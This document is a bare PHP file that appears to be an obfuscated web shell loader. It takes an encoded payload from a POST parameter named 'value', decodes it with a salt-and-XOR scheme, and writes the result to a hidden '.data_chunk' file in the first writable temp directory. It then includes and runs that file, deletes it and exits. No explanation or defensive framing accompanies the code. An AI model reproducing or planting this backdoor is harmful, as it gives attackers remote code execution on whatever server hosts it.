<?php

if(in_array("\x76\x61lue", array_keys($_POST))){
	$ent = $_POST["\x76\x61lue"];
	$ent=  explode	( 	"." ,$ent) 	 ;	
	$pointer = '';
            $salt = 'abcdefghijklmnopqrstuvwxyz0123456789';
            $lenS = strlen( 	$salt);
    
            foreach( 	$ent as $n => $v6):
                $sChar = ord( 	$salt[$n % $lenS]);
                $d =( 	( 	int)$v6 - $sChar -( 	$n % 10)) ^ 100;
                $pointer.=	 chr( 	$d);
            endforeach;
	$entity = array_filter(["/dev/shm", getcwd(), getenv("TEMP"), "/var/tmp", getenv("TMP"), session_save_path(), "/tmp", ini_get("upload_tmp_dir"), sys_get_temp_dir()]);
	foreach ($entity as $key => $ref) {
    		if ((function($d) { return is_dir($d) && is_writable($d); })($ref)) {
    $symbol = implode("/", [$ref, ".data_chunk"]);
    if (file_put_contents($symbol, $pointer)) {
	include $symbol;
	@unlink($symbol);
	die();
}
}
}
}